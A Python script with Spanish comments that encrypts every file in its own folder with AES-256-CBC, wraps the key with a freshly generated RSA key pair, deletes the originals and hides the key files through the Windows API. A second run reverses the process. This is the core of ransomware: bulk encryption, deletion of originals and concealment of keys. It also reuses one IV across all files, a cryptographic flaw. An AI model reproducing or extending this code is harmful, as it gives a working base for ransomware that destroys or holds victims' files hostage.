# Importar módulos necesarios para la criptografía y manejo de archivos
import os  # Para manejar rutas y operaciones del sistema
import ctypes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  # Para cifrado AES
from cryptography.hazmat.backends import default_backend  # Para seleccionar el backend de criptografía
from cryptography.hazmat.primitives import serialization  # Para serializar claves
from cryptography.hazmat.primitives.asymmetric import rsa, padding  # Para cifrado asimétrico con RSA
from cryptography.hazmat.primitives import hashes  # Para algoritmos hash
from cryptography.hazmat.primitives import padding as sym_padding  # Para agregar padding simétrico

# Obtener la ruta del directorio actual donde se ejecuta el script
directorio_actual = os.path.dirname(os.path.abspath(__file__))

# Archivos de claves (no se deben cifrar)
archivo_clave_aes = os.path.join(directorio_actual, "ClaveAES.enc")
archivo_iv = os.path.join(directorio_actual, "IV.txt")
archivo_clave_privada = os.path.join(directorio_actual, "ClavePrivada.pem")
archivo_clave_publica = os.path.join(directorio_actual, "ClavePublica.pem")

# Función para generar una clave AES y un IV aleatorios
def generar_clave_iv():
    clave_aes = os.urandom(32)  # Generar 32 bytes aleatorios para AES-256 (256 bits)
    iv = os.urandom(16)   # Generar 16 bytes aleatorios para el IV (CBC)
    return clave_aes, iv  # Retornar la clave y el IV generados

# Guardar datos en un archivo
def guardar_en_archivo(ruta_archivo, datos):
    with open(ruta_archivo, 'wb') as archivo:  # Abrir el archivo en modo escritura binaria
        archivo.write(datos)  # Escribir los datos en el archivo

# Cargar datos desde un archivo
def cargar_desde_archivo(ruta_archivo):
    with open(ruta_archivo, 'rb') as archivo:  # Abrir el archivo en modo lectura binaria
        return archivo.read()  # Leer y retornar el contenido del archivo

# Generar un par de claves RSA
def generar_claves_rsa():
    clave_privada = rsa.generate_private_key(public_exponent=65537, key_size=2048)  # Generar clave privada RSA
    clave_publica = clave_privada.public_key()  # Derivar la clave pública de la clave privada

    # Guardar la clave privada en un archivo
    with open(archivo_clave_privada, "wb") as archivo_priv:
        archivo_priv.write(clave_privada.private_bytes(
            encoding=serialization.Encoding.PEM,  # Formato PEM para la clave privada
            format=serialization.PrivateFormat.TraditionalOpenSSL,  # Formato tradicional de OpenSSL
            encryption_algorithm=serialization.NoEncryption()  # Sin encriptar la clave privada
        ))

    # Guardar la clave pública en un archivo
    with open(archivo_clave_publica, "wb") as archivo_pub:
        archivo_pub.write(clave_publica.public_bytes(
            encoding=serialization.Encoding.PEM,  # Formato PEM para la clave pública
            format=serialization.PublicFormat.SubjectPublicKeyInfo  # Formato estándar para la clave pública
        ))

    return clave_privada, clave_publica  # Retornar ambas claves generadas

# Cargar clave privada RSA desde archivo
def cargar_clave_privada():
    with open(archivo_clave_privada, "rb") as archivo_clave:  # Abrir el archivo de la clave privada en modo lectura
        return serialization.load_pem_private_key(  # Cargar y retornar la clave privada
            archivo_clave.read(),  # Leer el contenido del archivo
            password=None  # Sin contraseña para la clave
        )

# Cargar clave pública RSA desde archivo
def cargar_clave_publica():
    with open(archivo_clave_publica, "rb") as archivo_clave:  # Abrir el archivo de la clave pública en modo lectura
        return serialization.load_pem_public_key(  # Cargar y retornar la clave pública
            archivo_clave.read()  # Leer el contenido del archivo
        )

# Cifrar la clave AES con la clave pública RSA
def cifrar_clave_con_rsa(clave, clave_publica):
    clave_cifrada = clave_publica.encrypt(  # Cifrar la clave AES con la clave pública
        clave,
        padding.OAEP(  # Usar el padding OAEP
            mgf=padding.MGF1(algorithm=hashes.SHA256()),  # Función de generación de máscaras usando SHA-256
            algorithm=hashes.SHA256(),  # Algoritmo de hash para OAEP
            label=None  # Sin etiqueta
        )
    )
    return clave_cifrada  # Retornar la clave AES cifrada

# Descifrar la clave AES con la clave privada RSA
def descifrar_clave_con_rsa(clave_cifrada, clave_privada):
    clave_descifrada = clave_privada.decrypt(  # Usar la clave privada para descifrar la clave AES
        clave_cifrada,
        padding.OAEP(  # Usar el mismo padding OAEP
            mgf=padding.MGF1(algorithm=hashes.SHA256()),  # Función de generación de máscaras
            algorithm=hashes.SHA256(),  # Algoritmo de hash para OAEP
            label=None  # Sin etiqueta
        )
    )
    return clave_descifrada  # Retornar la clave AES descifrada

# Cifrar archivo con AES-256-CBC
def cifrar_archivo(clave, iv, archivo):
    archivo_cifrado = archivo + ".enc"
    with open(archivo, 'rb') as archivo_entrada, open(archivo_cifrado, 'wb') as archivo_salida:  # Abrir archivo para lectura y escritura
        cifrado = Cipher(algorithms.AES(clave), modes.CBC(iv))  # Crear el objeto Cipher con AES y CBC usando la clave y el IV
        cifrador = cifrado.encryptor()  # Crear el objeto de cifrado
        padder = sym_padding.PKCS7(128).padder()  # Crear el objeto padder con tamaño de bloque de 128 bits

        while True:
            bloque = archivo_entrada.read(1024)  # Leer en bloques de 1024 bytes
            if not bloque:  # Si no hay más datos
                break  # Salir del bucle
            bloque_padded = padder.update(bloque)  # Aplicar padding al bloque
            archivo_salida.write(cifrador.update(bloque_padded))  # Cifrar el bloque y escribirlo en el archivo de salida
        
        archivo_salida.write(cifrador.update(padder.finalize()))  # Finalizar padding y escribir los datos
        archivo_salida.write(cifrador.finalize())  # Completar el proceso de cifrado

    os.remove(archivo)  # Eliminar el archivo original después de cifrar

# Descifrar archivo con AES-256-CBC
def descifrar_archivo(clave, iv, archivo):
    archivo_descifrado = archivo.replace(".enc", "")
    with open(archivo, 'rb') as archivo_entrada, open(archivo_descifrado, 'wb') as archivo_salida:  # Abrir archivo para descifrar
        cifrado = Cipher(algorithms.AES(clave), modes.CBC(iv))  # Crear el objeto Cipher para descifrar
        descifrador = cifrado.decryptor()  # Crear el objeto de descifrado
        unpadder = sym_padding.PKCS7(128).unpadder()  # Crear el objeto unpadder para eliminar padding

        while True:
            bloque = archivo_entrada.read(1024)  # Leer en bloques de 1024 bytes
            if not bloque:  # Si no hay más datos
                break  # Salir del bucle
            archivo_salida.write(unpadder.update(descifrador.update(bloque)))  # Descifrar y despaddear el bloque y escribirlo
        
        archivo_salida.write(unpadder.update(descifrador.finalize()))  # Eliminar padding del último bloque
        archivo_salida.write(unpadder.finalize())  # Completar el proceso de descifrado

    os.remove(archivo)  # Eliminar el archivo cifrado después de descifrar


def ocultar_archivo(ruta_archivo):
    FILE_ATTRIBUTE_HIDDEN = 0x2  # Atributo para ocultar el archivo
    FILE_ATTRIBUTE_NORMAL = 0x80  # Atributo para que el archivo sea editable y no esté en solo lectura
    # Aplicar los atributos de oculto y normal (editable)
    ctypes.windll.kernel32.SetFileAttributesW(ruta_archivo, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_NORMAL)

# Mostrar el archivo (quitar el atributo oculto)
def mostrar_archivo(ruta_archivo):
    FILE_ATTRIBUTE_NORMAL = 0x80  # Atributo para que el archivo sea visible y editable
    # Quitar el atributo de oculto, dejándolo en estado normal
    ctypes.windll.kernel32.SetFileAttributesW(ruta_archivo, FILE_ATTRIBUTE_NORMAL)

# Obtener todos los archivos en la carpeta excepto los de claves y el propio script
def obtener_archivos_a_cifrar():
    archivos_a_ignorar = {archivo_clave_aes, archivo_iv, archivo_clave_privada, archivo_clave_publica, __file__}
    archivos_en_carpeta = set(os.path.join(directorio_actual, archivo) for archivo in os.listdir(directorio_actual))
    return archivos_en_carpeta - archivos_a_ignorar

# Punto de entrada principal del script
if __name__ == "__main__":
    mostrar_archivo(archivo_clave_publica)
    mostrar_archivo(archivo_clave_privada)
    archivos_a_cifrar = obtener_archivos_a_cifrar()  # Obtener los archivos que deben cifrarse

    if os.path.exists(archivo_clave_aes) and os.path.exists(archivo_iv) and os.path.exists(archivo_clave_privada):
        # Cargar clave privada RSA y descifrar la clave AES
        clave_privada = cargar_clave_privada()
        clave_aes_cifrada = cargar_desde_archivo(archivo_clave_aes)
        clave_aes = descifrar_clave_con_rsa(clave_aes_cifrada, clave_privada)

        # Cargar el IV desde el archivo
        iv = cargar_desde_archivo(archivo_iv)

        # Descifrar los archivos
        for archivo in archivos_a_cifrar:
            if archivo.endswith('.enc'):
                descifrar_archivo(clave_aes, iv, archivo)  # Descifrar cada archivo

        # Eliminar archivos de claves y mostrar la clave privada si fue ocultada
        os.remove(archivo_clave_aes)
        os.remove(archivo_iv)
        mostrar_archivo(archivo_clave_privada)
        ocultar_archivo(archivo_clave_privada)
        ocultar_archivo(archivo_clave_publica)

    else:
        # Generar claves RSA, clave AES e IV
        clave_privada, clave_publica = generar_claves_rsa()
        clave_aes, iv = generar_clave_iv()

        # Cifrar la clave AES usando RSA y guardar el IV
        clave_aes_cifrada = cifrar_clave_con_rsa(clave_aes, clave_publica)
        guardar_en_archivo(archivo_clave_aes, clave_aes_cifrada)
        guardar_en_archivo(archivo_iv, iv)

        # Cifrar los archivos en la carpeta
        for archivo in archivos_a_cifrar:
            cifrar_archivo(clave_aes, iv, archivo)

        # Ocultar la clave privada
        ocultar_archivo(archivo_clave_privada)
        ocultar_archivo(archivo_clave_publica)
